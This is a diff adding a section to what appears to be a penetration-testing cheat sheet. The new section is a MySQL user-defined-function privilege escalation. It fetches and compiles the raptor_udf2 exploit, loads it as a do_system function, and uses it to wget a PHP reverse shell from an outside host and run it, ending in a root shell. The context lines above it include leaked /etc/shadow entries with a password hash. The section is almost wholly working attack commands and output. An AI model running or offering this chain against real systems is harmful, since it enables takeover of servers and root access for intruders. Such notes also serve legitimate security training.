@@ -1227,6 +1227,39 @@ whoami
 root:$1$uF5XC.Im$8k0Gkw4wYaZkNzuOuySIx/:16902:0:99999:7:::                                                                                                              vcsa:!!:15422:0:99999:7:::
 pcap:!!:15422:0:99999:7:::
 ````
+### MySQL User Defined Functions
+````
+port 0.0.0.0:3306 open internally
+users with console mysql/bin/bash
+MySQL connection using root/NOPASS Yes
+````
+````
+your $IP>wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
+victim>gcc -g -c raptor_udf2.c
+victim>gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+victim>mysql -u root -p
+````
+````
+mysql> use mysql;
+mysql> create table foo(line blob);
+mysql> insert into foo values(load_file('/home/j0hn/script/raptor_udf2.so'));
+mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+mysql> select * from mysql.func;
++-----------+-----+----------------+----------+
+| name      | ret | dl             | type     |
++-----------+-----+----------------+----------+
+| do_system |   2 | raptor_udf2.so | function | 
++-----------+-----+----------------+----------+
+````
+````
+your $IP> cp /usr/share/webshells/php/php-reverse-shell.php .
+mv php-reverse-shell.php shell.php
+nc -nvlp 443
+mysql> select do_system('wget http://192.168.119.184/shell.php -O /tmp/shell.php;php /tmp/shell.php');
+sh-3.2# id
+uid=0(root) gid=0(root)
+````
 ### sudo -l / SUID Binaries
 #### (root) NOPASSWD: /usr/bin/nmap
 ````
